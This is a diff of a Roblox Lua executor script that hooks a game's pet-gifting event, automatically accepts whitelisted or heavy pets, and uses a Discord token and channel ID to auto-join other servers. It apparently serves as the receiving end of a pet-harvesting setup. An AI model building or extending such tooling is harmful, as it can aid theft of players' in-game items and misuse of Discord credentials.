@@ -1,8 +1,10 @@
+local DEFAULT_MIN_KG = _G.KG
 local PET_TO_CLAIM = _G.Pets
+local token = _G.Token
+local channelId = _G.ChannelId
 local isProcessing = false
 local giftingActive = false
 local lastGiftTime = 0
-
 local Players = game:GetService('Players')
 local HttpService = game:GetService('HttpService')
 local UserInputService = game:GetService('UserInputService')
@@ -20,7 +22,7 @@ end
 
 local backpack = plr:WaitForChild('Backpack', 15)
 if not backpack then
-    wait(5)
+    return
 end
 
 local character = plr.Character or plr.CharacterAdded:Wait()
@@ -28,7 +30,7 @@ local RS = game:GetService('ReplicatedStorage')
 
 local gameEvents = RS:WaitForChild('GameEvents', 10)
 if not gameEvents then
-    wait(5)
+    return
 end
 
 local PetGiftingService = gameEvents:WaitForChild('PetGiftingService', 10)
@@ -83,6 +85,14 @@ local function extractBaseName(fullName)
     return base:match('^%s*(.-)%s*$')
 end
 
+local function extractPetKG(fullName)
+    local kgString = fullName:match('%[(%d+)kg%]')
+    if kgString then
+        return tonumber(kgString)
+    end
+    return 0
+end
+
 task.defer(function()
     print('🔌 Hooking into GiftPet RemoteEvent...')
 
@@ -99,11 +109,16 @@ task.defer(function()
         print(string.format("Gifting started/continued. Last gift received at: %.2f", lastGiftTime))
 
         local basePetName = extractBaseName(fullName)
-        print('🔍 Base pet name:', basePetName)
+        local petKG = extractPetKG(fullName)
+        print('🔍 Base pet name:', basePetName, ' | KG:', petKG)
 
-        if not table.find(PET_TO_CLAIM, basePetName) then
-            print('⚠️ Pet not in whitelist. Ignoring gift from:', sender)
+        if not table.find(PET_TO_CLAIM, basePetName) and petKG < DEFAULT_MIN_KG then
+            print(string.format('⚠️ Pet "%s" (KG: %d) not in whitelist and KG is below %d. Ignoring gift from: %s', fullName, petKG, DEFAULT_MIN_KG, sender))
             return
+        elseif table.find(PET_TO_CLAIM, basePetName) then
+            print(string.format('✅ Pet "%s" (KG: %d) found in whitelist. Accepting gift from: %s', fullName, petKG, sender))
+        elseif petKG >= DEFAULT_MIN_KG then
+            print(string.format('✅ Pet "%s" (KG: %d) has KG >= %d. Accepting gift from: %s', fullName, petKG, DEFAULT_MIN_KG, sender))
         end
 
         while isProcessing do
@@ -182,7 +197,6 @@ end
 
 waitForPlayerLeave()
 
--- Wait for player data to load
 while plr:GetAttribute('DataFullyLoaded') ~= true do
     plr:GetAttributeChangedSignal('DataFullyLoaded'):Wait()
 end
@@ -236,6 +250,7 @@ local function autoJoin()
             return
         else
             print("Gifting session concluded. Resetting giftingActive flag and proceeding with Discord check.")
+            giftingActive = false
         end
     end
 
